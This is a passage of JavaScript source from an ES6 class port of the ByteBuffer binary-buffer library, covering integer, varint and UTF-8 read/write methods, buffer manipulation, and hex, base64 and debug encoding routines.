                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 2 + ") <= " + this.buffer.byteLength);
        };

        var value = 0;

        if (this.littleEndian) {
            value = this.view[offset];

            value |= this.view[offset + 1] << 8;
        } else {
            value = this.view[offset] << 8;

            value |= this.view[offset + 1];
        };

        if (relative) this.offset += 2;

        return value;
    };

    writeInt32(value, offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof value !== 'number' || value % 1 !== 0)
                throw TypeError("Illegal value: " + value + " (not an integer)");

            value |= 0;

            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        offset += 4;

        var capacity4 = this.buffer.byteLength;

        if (offset > capacity4)
            this.resize((capacity4 *= 2) > offset ? capacity4 : offset);

        offset -= 4;

        if (this.littleEndian) {
            this.view[offset + 3] = (value >>> 24) & 0xFF;

            this.view[offset + 2] = (value >>> 16) & 0xFF;

            this.view[offset + 1] = (value >>> 8) & 0xFF;

            this.view[offset] = value & 0xFF;
        } else {
            this.view[offset] = (value >>> 24) & 0xFF;

            this.view[offset + 1] = (value >>> 16) & 0xFF;

            this.view[offset + 2] = (value >>> 8) & 0xFF;

            this.view[offset + 3] = value & 0xFF;
        };

        if (relative) this.offset += 4;

        return this;
    };

    readInt32(offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 4 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 4 + ") <= " + this.buffer.byteLength);
        };

        var value = 0;

        if (this.littleEndian) {
            value = this.view[offset + 2] << 16;

            value |= this.view[offset + 1] << 8;

            value |= this.view[offset];

            value += this.view[offset + 3] << 24 >>> 0;
        } else {
            value = this.view[offset + 1] << 16;

            value |= this.view[offset + 2] << 8;

            value |= this.view[offset + 3];

            value += this.view[offset] << 24 >>> 0;
        };

        value |= 0;

        if (relative) this.offset += 4;

        return value;
    };

    writeUint32(value, offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof value !== 'number' || value % 1 !== 0)
                throw TypeError("Illegal value: " + value + " (not an integer)");

            value >>>= 0;

            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        offset += 4;

        var capacity5 = this.buffer.byteLength;

        if (offset > capacity5)
            this.resize((capacity5 *= 2) > offset ? capacity5 : offset);

        offset -= 4;

        if (this.littleEndian) {
            this.view[offset + 3] = (value >>> 24) & 0xFF;

            this.view[offset + 2] = (value >>> 16) & 0xFF;

            this.view[offset + 1] = (value >>> 8) & 0xFF;

            this.view[offset] = value & 0xFF;
        } else {
            this.view[offset] = (value >>> 24) & 0xFF;

            this.view[offset + 1] = (value >>> 16) & 0xFF;

            this.view[offset + 2] = (value >>> 8) & 0xFF;

            this.view[offset + 3] = value & 0xFF;
        };

        if (relative) this.offset += 4;

        return this;
    };

    readUint32(offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 4 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 4 + ") <= " + this.buffer.byteLength);
        };

        var value = 0;

        if (this.littleEndian) {
            value = this.view[offset + 2] << 16;

            value |= this.view[offset + 1] << 8;

            value |= this.view[offset];

            value += this.view[offset + 3] << 24 >>> 0;
        } else {
            value = this.view[offset + 1] << 16;

            value |= this.view[offset + 2] << 8;

            value |= this.view[offset + 3];

            value += this.view[offset] << 24 >>> 0;
        };

        if (relative) this.offset += 4;

        return value;
    };

    calculateVarint32(value) {
        value = value >>> 0;

        if (value < 1 << 7) return 1;

        else if (value < 1 << 14) return 2;

        else if (value < 1 << 21) return 3;

        else if (value < 1 << 28) return 4;

        else return 5;
    };

    writeVarint32(value, offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof value !== 'number' || value % 1 !== 0)
                throw TypeError("Illegal value: " + value + " (not an integer)");

            value |= 0;

            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        var size = this.calculateVarint32(value),
            b;

        offset += size;

        var capacity10 = this.buffer.byteLength;

        if (offset > capacity10)
            this.resize((capacity10 *= 2) > offset ? capacity10 : offset);

        offset -= size;

        value >>>= 0;

        while (value >= 0x80) {
            b = (value & 0x7f) | 0x80;

            this.view[offset++] = b;

            value >>>= 7;
        };

        this.view[offset++] = value;

        if (relative) {
            this.offset = offset;

            return this;
        };

        return size;
    };

    readVarint32(offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 1 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 1 + ") <= " + this.buffer.byteLength);
        };

        var c = 0,
            value = 0 >>> 0,
            b;

        do {
            if (!this.noAssert && offset > this.limit) {
                var err = Error("Truncated");

                err['truncated'] = true;

                throw err;
            };

            b = this.view[offset++];

            if (c < 5)
                value |= (b & 0x7f) << (7 * c);

            ++c;
        } while ((b & 0x80) !== 0);

        value |= 0;

        if (relative) {
            this.offset = offset;

            return value;
        };

        return {
            "value": value,
            "length": c
        };
    };

    readUTF8String(length, metrics, offset) {
        if (typeof metrics === 'number') {
            offset = metrics;

            metrics = undefined;
        };

        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (typeof metrics === 'undefined') metrics = "c";

        if (!this.noAssert) {
            if (typeof length !== 'number' || length % 1 !== 0)
                throw TypeError("Illegal length: " + length + " (not an integer)");

            length |= 0;

            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        var i = 0,
            start = offset,
            sd;

        if (metrics === "c") {
            sd = this.stringDestination();

            utfx.decodeUTF8(function () {
                return i < length && offset < this.limit ? this.view[offset++] : null;
            }.bind(this), function (cp) {
                ++i;
                utfx.UTF8toUTF16(cp, sd);
            });

            if (i !== length)
                throw RangeError("Illegal range: Truncated data, " + i + " == " + length);

            if (relative) {
                this.offset = offset;

                return sd();
            } else {
                return {
                    "string": sd(),
                    "length": offset - start
                };
            };
        } else if (metrics === "b") {
            if (!this.noAssert) {
                if (typeof offset !== 'number' || offset % 1 !== 0)
                    throw TypeError("Illegal offset: " + offset + " (not an integer)");

                offset >>>= 0;

                if (offset < 0 || offset + length > this.buffer.byteLength)
                    throw RangeError("Illegal offset: 0 <= " + offset + " (+" + length + ") <= " + this.buffer.byteLength);
            };

            var k = offset + length;

            utfx.decodeUTF8toUTF16(function () {
                return offset < k ? this.view[offset++] : null;
            }.bind(this), sd = this.stringDestination(), this.noAssert);

            if (offset !== k)
                throw RangeError("Illegal range: Truncated data, " + offset + " == " + k);

            if (relative) {
                this.offset = offset;

                return sd();
            } else {
                return {
                    'string': sd(),
                    'length': offset - start
                };
            };
        } else
            throw TypeError("Unsupported metrics: " + metrics);
    };

    writeVString(str, offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof str !== 'string')
                throw TypeError("Illegal str: Not a string");

            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        var start = offset,
            k, l;

        k = utfx.calculateUTF16asUTF8(this.stringSource(str), this.noAssert)[1];
        l = this.calculateVarint32(k);

        offset += l + k;
        var capacity15 = this.buffer.byteLength;

        if (offset > capacity15)
            this.resize((capacity15 *= 2) > offset ? capacity15 : offset);

        offset -= l + k;
        offset += this.writeVarint32(k, offset);

        utfx.encodeUTF16toUTF8(this.stringSource(str), function (b) {
            this.view[offset++] = b;
        }.bind(this));

        if (offset !== start + k + l)
            throw RangeError("Illegal range: Truncated data, " + offset + " == " + (offset + k + l));

        if (relative) {
            this.offset = offset;

            return this;
        };

        return offset - start;
    };

    readVString(offset) {
        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 1 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 1 + ") <= " + this.buffer.byteLength);
        };

        var start = offset;

        var len = this.readVarint32(offset);
        var str = this.readUTF8String(len['value'], "b", offset += len['length']);

        offset += str['length'];

        if (relative) {
            this.offset = offset;

            return str['string'];
        } else {
            return {
                'string': str['string'],
                'length': offset - start
            };
        };
    };

    append(source, encoding, offset) {
        if (typeof encoding === 'number' || typeof encoding !== 'string') {
            offset = encoding;

            encoding = undefined;
        };

        var relative = typeof offset === 'undefined';

        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        if (!(source instanceof ByteBuffer))
            source = ByteBuffer.wrap(source, encoding);

        var length = source.limit - source.offset;
        if (length <= 0) return this;

        offset += length;

        var capacity16 = this.buffer.byteLength;

        if (offset > capacity16)
            this.resize((capacity16 *= 2) > offset ? capacity16 : offset);

        offset -= length;
        this.view.set(source.view.subarray(source.offset, source.limit), offset);

        source.offset += length;

        if (relative) this.offset += length;

        return this;
    };

    appendTo(target, offset) {
        target.append(this, offset);

        return this;
    };

    assert(assert) {
        this.noAssert = !assert;

        return this;
    };

    capacity() {
        return this.buffer.byteLength;
    };

    clear() {
        this.offset = 0;
        this.limit = this.buffer.byteLength;
        this.markedOffset = -1;

        return this;
    };

    clone(copy) {
        var bb = new ByteBuffer(0, this.littleEndian, this.noAssert);

        if (copy) {
            bb.buffer = new ArrayBuffer(this.buffer.byteLength);
            bb.view = new Uint8Array(bb.buffer);
        } else {
            bb.buffer = this.buffer;
            bb.view = this.view;
        };

        bb.offset = this.offset;
        bb.markedOffset = this.markedOffset;
        bb.limit = this.limit;

        return bb;
    };

    compact(begin, end) {
        if (typeof begin === 'undefined') begin = this.offset;

        if (typeof end === 'undefined') end = this.limit;

        if (!this.noAssert) {
            if (typeof begin !== 'number' || begin % 1 !== 0)
                throw TypeError("Illegal begin: Not an integer");

            begin >>>= 0;

            if (typeof end !== 'number' || end % 1 !== 0)
                throw TypeError("Illegal end: Not an integer");

            end >>>= 0;

            if (begin < 0 || begin > end || end > this.buffer.byteLength)
                throw RangeError("Illegal range: 0 <= " + begin + " <= " + end + " <= " + this.buffer.byteLength);
        };

        if (begin === 0 && end === this.buffer.byteLength)
            return this;

        var len = end - begin;

        if (len === 0) {
            this.buffer = new ArrayBuffer(0);;

            this.view = null;

            if (this.markedOffset >= 0) this.markedOffset -= begin;

            this.offset = 0;

            this.limit = 0;

            return this;
        };

        var buffer = new ArrayBuffer(len);

        var view = new Uint8Array(buffer);

        view.set(this.view.subarray(begin, end));

        this.buffer = buffer;

        this.view = view;

        if (this.markedOffset >= 0) this.markedOffset -= begin;

        this.offset = 0;

        this.limit = len;

        return this;
    };

    copy(begin, end) {
        if (typeof begin === 'undefined') begin = this.offset;

        if (typeof end === 'undefined') end = this.limit;

        if (!this.noAssert) {
            if (typeof begin !== 'number' || begin % 1 !== 0)
                throw TypeError("Illegal begin: Not an integer");

            begin >>>= 0;

            if (typeof end !== 'number' || end % 1 !== 0)
                throw TypeError("Illegal end: Not an integer");

            end >>>= 0;

            if (begin < 0 || begin > end || end > this.buffer.byteLength)
                throw RangeError("Illegal range: 0 <= " + begin + " <= " + end + " <= " + this.buffer.byteLength);
        };

        if (begin === end)
            return new ByteBuffer(0, this.littleEndian, this.noAssert);

        var capacity = end - begin,
            bb = new ByteBuffer(capacity, this.littleEndian, this.noAssert);

        bb.offset = 0;

        bb.limit = capacity;

        if (bb.markedOffset >= 0) bb.markedOffset -= begin;

        this.copyTo(bb, 0, begin, end);

        return bb;
    };

    copyTo(target, targetOffset, sourceOffset, sourceLimit) {
        var relative,
            targetRelative;

        if (!this.noAssert) {
            if (!ByteBuffer.isByteBuffer(target))
                throw TypeError("Illegal target: Not a ByteBuffer");
        };

        targetOffset = (targetRelative = typeof targetOffset === 'undefined') ? target.offset : targetOffset | 0;

        sourceOffset = (relative = typeof sourceOffset === 'undefined') ? this.offset : sourceOffset | 0;

        sourceLimit = typeof sourceLimit === 'undefined' ? this.limit : sourceLimit | 0;

        if (targetOffset < 0 || targetOffset > target.buffer.byteLength)
            throw RangeError("Illegal target range: 0 <= " + targetOffset + " <= " + target.buffer.byteLength);

        if (sourceOffset < 0 || sourceLimit > this.buffer.byteLength)
            throw RangeError("Illegal source range: 0 <= " + sourceOffset + " <= " + this.buffer.byteLength);

        var len = sourceLimit - sourceOffset;

        if (len === 0)
            return target;

        target.ensureCapacity(targetOffset + len);

        target.view.set(this.view.subarray(sourceOffset, sourceLimit), targetOffset);

        if (relative) this.offset += len;

        if (targetRelative) target.offset += len;

        return this;
    };

    ensureCapacity(capacity) {
        var current = this.buffer.byteLength;

        if (current < capacity)
            return this.resize((current *= 2) > capacity ? current : capacity);

        return this;
    };

    fill(value, begin, end) {
        var relative = typeof begin === 'undefined';

        if (relative) begin = this.offset;

        if (typeof value === 'string' && value.length > 0)
            value = value.charCodeAt(0);

        if (typeof begin === 'undefined') begin = this.offset;
        if (typeof end === 'undefined') end = this.limit;

        if (!this.noAssert) {
            if (typeof value !== 'number' || value % 1 !== 0)
                throw TypeError("Illegal value: " + value + " (not an integer)");

            value |= 0;

            if (typeof begin !== 'number' || begin % 1 !== 0)
                throw TypeError("Illegal begin: Not an integer");

            begin >>>= 0;

            if (typeof end !== 'number' || end % 1 !== 0)
                throw TypeError("Illegal end: Not an integer");

            end >>>= 0;

            if (begin < 0 || begin > end || end > this.buffer.byteLength)
                throw RangeError("Illegal range: 0 <= " + begin + " <= " + end + " <= " + this.buffer.byteLength);
        };

        if (begin >= end)
            return this;

        while (begin < end) this.view[begin++] = value;

        if (relative) this.offset = begin;

        return this;
    };

    flip() {
        this.limit = this.offset;

        this.offset = 0;

        return this;
    };

    mark(offset) {
        offset = typeof offset === 'undefined' ? this.offset : offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        this.markedOffset = offset;

        return this;
    };

    order(littleEndian) {
        if (!this.noAssert) {
            if (typeof littleEndian !== 'boolean')
                throw TypeError("Illegal littleEndian: Not a boolean");
        };

        this.littleEndian = !!littleEndian;

        return this;
    };

    LE(littleEndian) {
        this.littleEndian = typeof littleEndian !== 'undefined' ? !!littleEndian : true;

        return this;
    };

    BE(bigEndian) {
        this.littleEndian = typeof bigEndian !== 'undefined' ? !bigEndian : false;

        return this;
    };

    prepend(source, encoding, offset) {
        if (typeof encoding === 'number' || typeof encoding !== 'string') {
            offset = encoding;
            encoding = undefined;
        };

        var relative = typeof offset === 'undefined';
        if (relative) offset = this.offset;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: " + offset + " (not an integer)");

            offset >>>= 0;

            if (offset < 0 || offset + 0 > this.buffer.byteLength)
                throw RangeError("Illegal offset: 0 <= " + offset + " (+" + 0 + ") <= " + this.buffer.byteLength);
        };

        if (!(source instanceof ByteBuffer))
            source = ByteBuffer.wrap(source, encoding);

        var len = source.limit - source.offset;

        if (len <= 0) return this;

        var diff = len - offset;

        if (diff > 0) {
            var buffer = new ArrayBuffer(this.buffer.byteLength + diff);
            var view = new Uint8Array(buffer);

            view.set(this.view.subarray(offset, this.buffer.byteLength), len);

            this.buffer = buffer;
            this.view = view;
            this.offset += diff;

            if (this.markedOffset >= 0) this.markedOffset += diff;
            this.limit += diff;
            offset += diff;
        } else {
            var arrayView = new Uint8Array(this.buffer);
        };

        this.view.set(source.view.subarray(source.offset, source.limit), offset - len);

        source.offset = source.limit;

        if (relative)
            this.offset -= len;

        return this;
    };

    prependTo(target, offset) {
        target.prepend(this, offset);
        return this;
    };

    printDebug(out) {
        if (typeof out !== 'function') out = console.log.bind(console);
        out(
            this.toString() + "\n" +
            "-------------------------------------------------------------------\n" +
            this.toDebug(true)
        );
    };

    remaining() {
        return this.limit - this.offset;
    };

    reset() {
        if (this.markedOffset >= 0) {
            this.offset = this.markedOffset;

            this.markedOffset = -1;
        } else {
            this.offset = 0;
        };

        return this;
    };

    resize(capacity) {
        if (!this.noAssert) {
            if (typeof capacity !== 'number' || capacity % 1 !== 0)
                throw TypeError("Illegal capacity: " + capacity + " (not an integer)");

            capacity |= 0;

            if (capacity < 0)
                throw RangeError("Illegal capacity: 0 <= " + capacity);
        };

        if (this.buffer.byteLength < capacity) {
            var buffer = new ArrayBuffer(capacity);

            var view = new Uint8Array(buffer);

            view.set(this.view);

            this.buffer = buffer;

            this.view = view;
        };

        return this;
    };

    reverse(begin, end) {
        if (typeof begin === 'undefined') begin = this.offset;
        if (typeof end === 'undefined') end = this.limit;

        if (!this.noAssert) {
            if (typeof begin !== 'number' || begin % 1 !== 0)
                throw TypeError("Illegal begin: Not an integer");

            begin >>>= 0;

            if (typeof end !== 'number' || end % 1 !== 0)
                throw TypeError("Illegal end: Not an integer");

            end >>>= 0;

            if (begin < 0 || begin > end || end > this.buffer.byteLength)
                throw RangeError("Illegal range: 0 <= " + begin + " <= " + end + " <= " + this.buffer.byteLength);
        };

        if (begin === end)
            return this;

        Array.prototype.reverse.call(this.view.subarray(begin, end));

        return this;
    };

    skip(length) {
        if (!this.noAssert) {
            if (typeof length !== 'number' || length % 1 !== 0)
                throw TypeError("Illegal length: " + length + " (not an integer)");
            length |= 0;
        };

        var offset = this.offset + length;

        if (!this.noAssert) {
            if (offset < 0 || offset > this.buffer.byteLength)
                throw RangeError("Illegal length: 0 <= " + this.offset + " + " + length + " <= " + this.buffer.byteLength);
        };

        this.offset = offset;
        return this;
    };

    slice(begin, end) {
        if (typeof begin === 'undefined') begin = this.offset;
        if (typeof end === 'undefined') end = this.limit;

        if (!this.noAssert) {
            if (typeof begin !== 'number' || begin % 1 !== 0)
                throw TypeError("Illegal begin: Not an integer");
            begin >>>= 0;

            if (typeof end !== 'number' || end % 1 !== 0)
                throw TypeError("Illegal end: Not an integer");
            end >>>= 0;

            if (begin < 0 || begin > end || end > this.buffer.byteLength)
                throw RangeError("Illegal range: 0 <= " + begin + " <= " + end + " <= " + this.buffer.byteLength);
        };

        var bb = this.clone();

        bb.offset = begin;

        bb.limit = end;

        return bb;
    };

    toArrayBuffer(forceCopy) {
        var offset = this.offset,
            limit = this.limit;

        if (!this.noAssert) {
            if (typeof offset !== 'number' || offset % 1 !== 0)
                throw TypeError("Illegal offset: Not an integer");

            offset >>>= 0;

            if (typeof limit !== 'number' || limit % 1 !== 0)
                throw TypeError("Illegal limit: Not an integer");

            limit >>>= 0;

            if (offset < 0 || offset > limit || limit > this.buffer.byteLength)
                throw RangeError("Illegal range: 0 <= " + offset + " <= " + limit + " <= " + this.buffer.byteLength);
        };

        if (!forceCopy && offset === 0 && limit === this.buffer.byteLength)
            return this.buffer;

        if (offset === limit)
            return this.EMPTY_BUFFER;

        var buffer = new ArrayBuffer(limit - offset);

        new Uint8Array(buffer).set(new Uint8Array(this.buffer).subarray(offset, limit), 0);

        return buffer;
    };

    toString(encoding, begin, end) {
        if (typeof encoding === 'undefined')
            return "ByteBufferAB(offset=" + this.offset + ",markedOffset=" + this.markedOffset + ",limit=" + this.limit + ",capacity=" + this.capacity() + ")";

        if (typeof encoding === 'number')
            encoding = "utf8",
                begin = encoding,
                end = begin;

        switch (encoding) {
            case "utf8":
                return this.toUTF8(begin, end);

            case "base64":
                return this.toBase64(begin, end);

            case "hex":
                return this.toHex(begin, end);

            case "binary":
                return this.toBinary(begin, end);

            case "debug":
                return this.toDebug();

            case "columns":
                return this.toColumns();

            default:
                throw Error("Unsupported encoding: " + encoding);
        };
    };

    toBase64(begin, end) {
        if (typeof begin === 'undefined')
            begin = this.offset;

        if (typeof end === 'undefined')
            end = this.limit;

        begin = begin | 0;

        end = end | 0;

        if (begin < 0 || end > this.capacity || begin > end)
            throw RangeError("begin, end");

        var sd;

        lxiv.encode(function () {
            return begin < end ? this.view[begin++] : null;
        }.bind(this), sd = this.stringDestination());

        return sd();
    };

    fromBase64(str, littleEndian) {
        if (typeof str !== 'string')
            throw TypeError("str");

        var bb = new ByteBuffer(str.length / 4 * 3, littleEndian),
            i = 0;

        lxiv.decode(this.stringSource(str), function (b) {
            bb.view[i++] = b;
        });

        bb.limit = i;

        return bb;
    };

    btoa(str) {
        return this.fromBinary(str).toBase64();
    };

    atob(b64) {
        return this.fromBase64(b64).toBinary();
    };

    toBinary(begin, end) {
        if (typeof begin === 'undefined')
            begin = this.offset;

        if (typeof end === 'undefined')
            end = this.limit;

        begin |= 0;

        end |= 0;

        if (begin < 0 || end > this.capacity() || begin > end)
            throw RangeError("begin, end");

        if (begin === end)
            return "";

        var chars = [],
            parts = [];

        while (begin < end) {
            chars.push(this.view[begin++]);

            if (chars.length >= 1024)
                parts.push(String.fromCharCode.apply(String, chars)),
                    chars = [];
        };

        return parts.join('') + String.fromCharCode.apply(String, chars);
    };

    fromBinary(str, littleEndian) {
        if (typeof str !== 'string')
            throw TypeError("str");

        var i = 0,
            k = str.length,
            charCode,
            bb = new ByteBuffer(k, littleEndian);

        while (i < k) {
            charCode = str.charCodeAt(i);

            if (charCode > 0xff)
                throw RangeError("illegal char code: " + charCode);

            bb.view[i++] = charCode;
        };

        bb.limit = k;

        return bb;
    };

    toDebug(columns) {
        var i = -1,
            k = this.buffer.byteLength,
            b,
            hex = "",
            asc = "",
            out = "";

        while (i < k) {
            if (i !== -1) {
                b = this.view[i];

                if (b < 0x10) hex += "0" + b.toString(16).toUpperCase();

                else hex += b.toString(16).toUpperCase();

                if (columns)
                    asc += b > 32 && b < 127 ? String.fromCharCode(b) : '.';
            };

            ++i;

            if (columns) {
                if (i > 0 && i % 16 === 0 && i !== k) {
                    while (hex.length < 3 * 16 + 3) hex += " ";

                    out += hex + asc + "\n";

                    hex = asc = "";
                };
            };

            if (i === this.offset && i === this.limit)
                hex += i === this.markedOffset ? "!" : "|";

            else if (i === this.offset)
                hex += i === this.markedOffset ? "[" : "<";

            else if (i === this.limit)
                hex += i === this.markedOffset ? "]" : ">";

            else
                hex += i === this.markedOffset ? "'" : (columns || (i !== 0 && i !== k) ? " " : "");
        };

        if (columns && hex !== " ") {
            while (hex.length < 3 * 16 + 3)
                hex += " ";

            out += hex + asc + "\n";
        };

        return columns ? out : hex;
    };

    fromDebug(str, littleEndian, noAssert) {
        var k = str.length,
            bb = new ByteBuffer(((k + 1) / 3) | 0, littleEndian, noAssert);

        var i = 0,
            j = 0,
            ch, b,
            rs = false,
            ho = false,
            hm = false,
            hl = false,
            fail = false;

        while (i < k) {
            switch (ch = str.charAt(i++)) {
                case '!':
                    if (!noAssert) {
                        if (ho || hm || hl) {
                            fail = true;

                            break;
                        };

                        ho = hm = hl = true;
                    };

                    bb.offset = bb.markedOffset = bb.limit = j;

                    rs = false;

                    break;
                case '|':
                    if (!noAssert) {
                        if (ho || hl) {
                            fail = true;

                            break;
                        };

                        ho = hl = true;
                    };

                    bb.offset = bb.limit = j;

                    rs = false;

                    break;
                case '[':
                    if (!noAssert) {
                        if (ho || hm) {
                            fail = true;

                            break;
                        };

                        ho = hm = true;
                    };

                    bb.offset = bb.markedOffset = j;

                    rs = false;

                    break;
                case '<':
                    if (!noAssert) {
                        if (ho) {
                            fail = true;

                            break;
                        };

                        ho = true;
                    };

                    bb.offset = j;

                    rs = false;

                    break;
                case ']':
                    if (!noAssert) {
                        if (hl || hm) {
                            fail = true;

                            break;
                        };

                        hl = hm = true;
                    };

                    bb.limit = bb.markedOffset = j;

                    rs = false;

                    break;
                case '>':
                    if (!noAssert) {
                        if (hl) {
                            fail = true;

                            break;
                        };

                        hl = true;
                    };

                    bb.limit = j;

                    rs = false;

                    break;
                case "'":
                    if (!noAssert) {
                        if (hm) {
                            fail = true;
                            break;
                        };

                        hm = true;
                    };

                    bb.markedOffset = j;

                    rs = false;

                    break;
                case ' ':
                    rs = false;

                    break;
                default:
                    if (!noAssert) {
                        if (rs) {
                            fail = true;

                            break;
                        };
                    };

                    b = parseInt(ch + str.charAt(i++), 16);

                    if (!noAssert) {
                        if (isNaN(b) || b < 0 || b > 255)
                            throw TypeError("Illegal str: Not a debug encoded string");
                    };

                    bb.view[j++] = b;

                    rs = true;
            };

            if (fail)
                throw TypeError("Illegal str: Invalid symbol at " + i);
        };

        if (!noAssert) {
            if (!ho || !hl)
                throw TypeError("Illegal str: Missing offset or limit");

            if (j < bb.buffer.byteLength)
                throw TypeError("Illegal str: Not a debug encoded string (is it hex?) " + j + " < " + k);
        };

        return bb;
    };

    toHex(begin, end) {
        begin = typeof begin === 'undefined' ? this.offset : begin;

        end = typeof end === 'undefined' ? this.limit : end;

        if (!this.noAssert) {
            if (typeof begin !== 'number' || begin % 1 !== 0)
                throw TypeError("Illegal begin: Not an integer");

            begin >>>= 0;

            if (typeof end !== 'number' || end % 1 !== 0)
                throw TypeError("Illegal end: Not an integer");

            end >>>= 0;

            if (begin < 0 || begin > end || end > this.buffer.byteLength)
                throw RangeError("Illegal range: 0 <= " + begin + " <= " + end + " <= " + this.buffer.byteLength);
        };

        var out = new Array(end - begin),
            b;

        while (begin < end) {
            b = this.view[begin++];

            if (b < 0x10)
                out.push("0", b.toString(16));

            else out.push(b.toString(16));
        };

        return out.join('');
    };

    fromHex(str, littleEndian, noAssert) {
        if (!noAssert) {
            if (typeof str !== 'string')
                throw TypeError("Illegal str: Not a string");

            if (str.length % 2 !== 0)
                throw TypeError("Illegal str: Length not a multiple of 2");
        };

        var k = str.length,
            bb = new ByteBuffer((k / 2) | 0, littleEndian),
            b;

        for (var i = 0, j = 0; i < k; i += 2) {
            b = parseInt(str.substring(i, i + 2), 16);

            if (!noAssert)
                if (!isFinite(b) || b < 0 || b > 255)
                    throw TypeError("Illegal str: Contains non-hex characters");

            bb.view[j++] = b;
        };

        bb.limit = j;

        return bb;
    };

    toUTF8(begin, end) {
        if (typeof begin === 'undefined') begin = this.offset;

        if (typeof end === 'undefined') end = this.limit;

        if (!this.noAssert) {
            if (typeof begin !== 'number' || begin % 1 !== 0)
                throw TypeError("Illegal begin: Not an integer");

            begin >>>= 0;

            if (typeof end !== 'number' || end % 1 !== 0)
                throw TypeError("Illegal end: Not an integer");

            end >>>= 0;

            if (begin < 0 || begin > end || end > this.buffer.byteLength)
                throw RangeError("Illegal range: 0 <= " + begin + " <= " + end + " <= " + this.buffer.byteLength);
        };

        var sd;

        try {
            utfx.decodeUTF8toUTF16(function () {
                return begin < end ? this.view[begin++] : null;
            }.bind(this), sd = this.stringDestination());
        } catch (e) {
            if (begin !== end)
                throw RangeError("Illegal range: Truncated data, " + begin + " != " + end);
        };

        return sd();
    };

    fromUTF8(str, littleEndian, noAssert) {
        if (!noAssert)
            if (typeof str !== 'string')
                throw TypeError("Illegal str: Not a string");

        var bb = new ByteBuffer(utfx.calculateUTF16asUTF8(this.stringSource(str), true)[1], littleEndian, noAssert),
            i = 0;

        utfx.encodeUTF16toUTF8(this.stringSource(str), function (b) {
            bb.view[i++] = b;
        });

        bb.limit = i;

        return bb;
    };
};

ByteBuffer.VERSION = "5.0.1";
ByteBuffer.LITTLE_ENDIAN = true;
ByteBuffer.BIG_ENDIAN = false;
ByteBuffer.DEFAULT_CAPACITY = 16;
ByteBuffer.DEFAULT_ENDIAN = ByteBuffer.BIG_ENDIAN;
ByteBuffer.DEFAULT_NOASSERT = false;
ByteBuffer.Long = null;

ByteBuffer.accessor = function () {
    return Uint8Array;
};

ByteBuffer.allocate = function (capacity, littleEndian, noAssert) {
    return new ByteBuffer(capacity, littleEndian, noAssert);
};

ByteBuffer.concat = function (buffers, encoding, littleEndian, noAssert) {
    if (typeof encoding === 'boolean' || typeof encoding !== 'string') {
